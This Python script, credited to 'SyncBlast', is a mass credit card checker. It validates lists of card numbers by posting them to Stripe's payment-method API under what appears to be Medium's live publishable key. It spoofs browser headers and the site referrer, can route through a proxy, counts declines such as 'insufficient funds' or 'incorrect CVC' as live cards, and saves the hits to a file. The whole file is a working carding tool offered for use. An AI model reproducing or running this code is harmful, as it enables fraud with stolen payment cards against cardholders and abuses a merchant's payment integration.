#!/usr/bin/env python3
"""
========================================
  MEDIUM STRIPE CARD CHECKER
  Standalone Version for Pydroid3
========================================

Usage:
  1. Single card check: Run script and enter card when prompted
  2. Mass check: Enter multiple cards separated by newlines
  3. File check: Load cards from a text file

Requirements:
  pip install httpx

Author: SyncBlast
"""

import asyncio
import uuid
import time
import re
import os
from urllib.parse import urlencode

try:
    import httpx
except ImportError:
    print("Installing required package: httpx")
    os.system("pip install httpx")
    import httpx


# ==================== CONFIGURATION ====================

STRIPE_PK = "pk_live_7FReX44VnNIInZwrIIx6ghjl"
STRIPE_VERSION = "2025-03-31.basil"

# Optional: Set your proxy here (format: "http://user:pass@host:port")
PROXY = None


# ==================== HELPER FUNCTIONS ====================

def generate_guid():
    return str(uuid.uuid4()) + "6a66cf"

def generate_muid():
    return str(uuid.uuid4()) + "3ed771"

def generate_sid():
    return str(uuid.uuid4()) + "3a3b60"

def generate_session_id():
    return str(uuid.uuid4())


def get_stripe_headers():
    return {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }


def luhn_check(card_number):
    """Validate card number using Luhn algorithm"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10 == 0


def get_card_brand(cc):
    """Detect card brand from number"""
    cc = str(cc)
    if cc.startswith('4'):
        return 'VISA'
    elif cc.startswith(('51', '52', '53', '54', '55')) or (2221 <= int(cc[:4]) <= 2720):
        return 'MASTERCARD'
    elif cc.startswith(('34', '37')):
        return 'AMEX'
    elif cc.startswith(('6011', '644', '645', '646', '647', '648', '649', '65')):
        return 'DISCOVER'
    elif cc.startswith('62'):
        return 'UNIONPAY'
    else:
        return 'UNKNOWN'


def extract_cards(text):
    """Extract all cards from text"""
    return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)


# ==================== CORE CHECKER ====================

async def create_payment_method(cc, mes, ano, cvv, proxy=None):
    """Create a payment method on Stripe"""
    guid = generate_guid()
    muid = generate_muid()
    sid = generate_sid()
    session_id = generate_session_id()
    
    # Format year
    if len(str(ano)) == 4:
        ano = str(ano)[2:]
    
    data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': str(mes).zfill(2),
        'card[exp_year]': str(ano),
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
        'referrer': 'https://medium.com',
        'time_on_page': str(int(time.time() * 1000) % 100000),
        'client_attribution_metadata[client_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
        'client_attribution_metadata[merchant_integration_version]': '2017',
        'key': STRIPE_PK,
        '_stripe_version': STRIPE_VERSION,
    }
    
    headers = get_stripe_headers()
    
    try:
        transport = None
        if proxy:
            transport = httpx.AsyncHTTPTransport(proxy=proxy)
        
        async with httpx.AsyncClient(timeout=60.0, transport=transport) as client:
            response = await client.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=urlencode(data)
            )
            result = response.json()
            
            if 'id' in result:
                return {"success": True, "pm_id": result['id'], "response": result}
            elif 'error' in result:
                error = result['error']
                return {
                    "success": False,
                    "error": error.get('decline_code', error.get('code', 'unknown')),
                    "message": error.get('message', 'Unknown error'),
                    "response": result
                }
            else:
                return {"success": False, "error": "unknown", "message": "Unexpected response", "response": result}
                
    except httpx.TimeoutException:
        return {"success": False, "error": "timeout", "message": "Request timeout"}
    except Exception as e:
        return {"success": False, "error": "exception", "message": str(e)}


async def check_card(cc, mes, ano, cvv, proxy=None):
    """
    Check a card using Medium/Stripe
    Returns: (status, message, raw_response)
    """
    pm_result = await create_payment_method(cc, mes, ano, cvv, proxy)
    
    if not pm_result.get('success'):
        error = pm_result.get('error', 'unknown')
        message = pm_result.get('message', 'Unknown error')
        
        error_lower = error.lower()
        message_lower = message.lower()
        
        # Card number errors
        if any(x in error_lower for x in ['invalid_number', 'incorrect_number']):
            return ("CCN", "Invalid Card Number", error)
        
        # CVV errors - card is live
        if any(x in error_lower for x in ['incorrect_cvc', 'invalid_cvc']):
            return ("APPROVED", "Incorrect CVC [Live Card]", error)
        
        # Expiry errors - card is live
        if any(x in error_lower for x in ['invalid_expiry', 'expired_card', 'card_expired']):
            return ("APPROVED", "Expiry Issue [Live Card]", error)
        
        # Insufficient funds - live card
        if 'insufficient_funds' in error_lower:
            return ("APPROVED", "Insufficient Funds [Live Card]", error)
        
        # Generic declined
        if 'card_declined' in error_lower or 'declined' in error_lower:
            if 'stolen' in message_lower or 'lost' in message_lower:
                return ("DECLINED", "Card Reported Lost/Stolen", error)
            if 'pickup' in message_lower:
                return ("DECLINED", "Card Pickup - Possible Fraud", error)
            if 'do_not_honor' in error_lower:
                return ("DECLINED", "Do Not Honor", error)
            if 'fraudulent' in error_lower:
                return ("DECLINED", "Suspected Fraud", error)
            return ("DECLINED", message, error)
        
        # 3D Secure required - live card
        if '3d_secure' in error_lower or 'authentication_required' in error_lower:
            return ("APPROVED", "3D Secure Required [Live Card]", error)
        
        # Rate limits
        if 'rate_limit' in error_lower:
            return ("ERROR", "Rate Limited", error)
        
        return ("DECLINED", message, error)
    
    pm_id = pm_result.get('pm_id')
    return ("LIVE", f"Payment Method Created: {pm_id}", pm_id)


async def check_card_full(fullcc, proxy=None):
    """Check card from full format: cc|mm|yy|cvv"""
    parts = fullcc.replace('/', '|').replace(' ', '').split('|')
    
    if len(parts) < 4:
        return ("ERROR", "Invalid format. Use: cc|mm|yy|cvv", "format_error")
    
    cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
    
    if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
        return ("CCN", "Invalid card number length", "invalid_length")
    
    if not luhn_check(cc):
        return ("CCN", "Failed Luhn check", "luhn_failed")
    
    return await check_card(cc, mes, ano, cvv, proxy)


# ==================== OUTPUT FORMATTING ====================

def get_status_display(status):
    """Get display string for status"""
    displays = {
        "LIVE": "\033[92m[CHARGED 💎]\033[0m",
        "APPROVED": "\033[93m[APPROVED ✓]\033[0m",
        "CCN": "\033[91m[INVALID CCN ✗]\033[0m",
        "DECLINED": "\033[91m[DECLINED ✗]\033[0m",
        "ERROR": "\033[90m[ERROR ⚠]\033[0m"
    }
    return displays.get(status, "[UNKNOWN]")


def print_result(card, status, message, raw, time_taken=None):
    """Print formatted result"""
    brand = get_card_brand(card.split('|')[0])
    status_display = get_status_display(status)
    
    print("─" * 50)
    print(f"Card   : {card}")
    print(f"Brand  : {brand}")
    print(f"Status : {status_display}")
    print(f"Result : {message}")
    if time_taken:
        print(f"Time   : {time_taken}s")
    print("─" * 50)


def print_summary(total, hits, declined, errors, time_taken):
    """Print check summary"""
    print("\n" + "═" * 50)
    print("                   SUMMARY")
    print("═" * 50)
    print(f"  Total Checked : {total}")
    print(f"  \033[92mHits (Live/Approved)\033[0m : {hits}")
    print(f"  \033[91mDeclined\033[0m : {declined}")
    print(f"  \033[90mErrors\033[0m : {errors}")
    print(f"  Time Taken : {time_taken}s")
    print("═" * 50)


# ==================== MAIN FUNCTIONS ====================

def single_check():
    """Check a single card"""
    print("\n" + "═" * 50)
    print("       SINGLE CARD CHECK - Medium Stripe")
    print("═" * 50)
    
    card = input("\nEnter card (cc|mm|yy|cvv): ").strip()
    
    if not card:
        print("No card entered!")
        return
    
    print("\n[*] Checking card...")
    
    start = time.time()
    
    async def _check():
        return await check_card_full(card, PROXY)
    
    status, message, raw = asyncio.get_event_loop().run_until_complete(_check())
    
    time_taken = round(time.time() - start, 2)
    
    print_result(card, status, message, raw, time_taken)


def mass_check():
    """Check multiple cards"""
    print("\n" + "═" * 50)
    print("        MASS CARD CHECK - Medium Stripe")
    print("═" * 50)
    
    print("\nOptions:")
    print("  1. Enter cards manually (one per line, empty line to finish)")
    print("  2. Load from file")
    
    choice = input("\nChoice (1/2): ").strip()
    
    cards = []
    
    if choice == "1":
        print("\nEnter cards (cc|mm|yy|cvv), one per line.")
        print("Press Enter on empty line to start checking.\n")
        
        while True:
            line = input()
            if not line:
                break
            extracted = extract_cards(line)
            cards.extend(extracted)
    
    elif choice == "2":
        filename = input("\nEnter filename: ").strip()
        try:
            with open(filename, 'r') as f:
                content = f.read()
                cards = extract_cards(content)
        except FileNotFoundError:
            print(f"File not found: {filename}")
            return
    
    if not cards:
        print("No valid cards found!")
        return
    
    print(f"\n[*] Found {len(cards)} cards to check...")
    print("=" * 50)
    
    hits = 0
    declined = 0
    errors = 0
    
    start = time.time()
    
    async def _check_all():
        nonlocal hits, declined, errors
        
        for i, card in enumerate(cards, 1):
            print(f"\n[{i}/{len(cards)}] Checking: {card[:16]}...")
            
            status, message, raw = await check_card_full(card, PROXY)
            
            if status in ("LIVE", "APPROVED"):
                hits += 1
            elif status == "DECLINED":
                declined += 1
            else:
                errors += 1
            
            print_result(card, status, message, raw)
            
            # Delay to avoid rate limiting
            await asyncio.sleep(1)
    
    asyncio.get_event_loop().run_until_complete(_check_all())
    
    time_taken = round(time.time() - start, 2)
    
    print_summary(len(cards), hits, declined, errors, time_taken)


def save_results_check():
    """Check cards and save results to file"""
    print("\n" + "═" * 50)
    print("     CHECK & SAVE RESULTS - Medium Stripe")
    print("═" * 50)
    
    filename = input("\nEnter input filename: ").strip()
    
    try:
        with open(filename, 'r') as f:
            content = f.read()
            cards = extract_cards(content)
    except FileNotFoundError:
        print(f"File not found: {filename}")
        return
    
    if not cards:
        print("No valid cards found!")
        return
    
    print(f"\n[*] Found {len(cards)} cards to check...")
    
    output_file = input("Enter output filename (or press Enter for default): ").strip()
    if not output_file:
        output_file = f"results_{int(time.time())}.txt"
    
    hits_list = []
    declined_list = []
    
    start = time.time()
    
    async def _check_all():
        for i, card in enumerate(cards, 1):
            print(f"[{i}/{len(cards)}] Checking: {card[:16]}...", end=" ")
            
            status, message, raw = await check_card_full(card, PROXY)
            
            status_display = get_status_display(status)
            print(status_display)
            
            if status in ("LIVE", "APPROVED"):
                hits_list.append(f"{card} | {status} | {message}")
            else:
                declined_list.append(f"{card} | {status} | {message}")
            
            await asyncio.sleep(1)
    
    asyncio.get_event_loop().run_until_complete(_check_all())
    
    time_taken = round(time.time() - start, 2)
    
    # Save results
    with open(output_file, 'w') as f:
        f.write("=" * 60 + "\n")
        f.write("          MEDIUM STRIPE CHECKER RESULTS\n")
        f.write("=" * 60 + "\n\n")
        
        f.write(f"Total Checked: {len(cards)}\n")
        f.write(f"Hits: {len(hits_list)}\n")
        f.write(f"Declined: {len(declined_list)}\n")
        f.write(f"Time: {time_taken}s\n\n")
        
        if hits_list:
            f.write("-" * 40 + "\n")
            f.write("HITS (LIVE/APPROVED):\n")
            f.write("-" * 40 + "\n")
            for hit in hits_list:
                f.write(hit + "\n")
            f.write("\n")
        
        if declined_list:
            f.write("-" * 40 + "\n")
            f.write("DECLINED:\n")
            f.write("-" * 40 + "\n")
            for dec in declined_list:
                f.write(dec + "\n")
    
    print(f"\n[+] Results saved to: {output_file}")
    print_summary(len(cards), len(hits_list), len(declined_list), 0, time_taken)


def main():
    """Main menu"""
    while True:
        print("\n" + "═" * 50)
        print("    MEDIUM STRIPE CARD CHECKER - Pydroid3")
        print("    Author: SyncBlast | @syncblast")
        print("═" * 50)
        print("\n  1. Single Card Check")
        print("  2. Mass Card Check")
        print("  3. Check & Save Results")
        print("  4. Exit")
        print()
        
        choice = input("Select option (1-4): ").strip()
        
        if choice == "1":
            single_check()
        elif choice == "2":
            mass_check()
        elif choice == "3":
            save_results_check()
        elif choice == "4":
            print("\nGoodbye!")
            break
        else:
            print("\nInvalid option!")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nInterrupted by user. Exiting...")
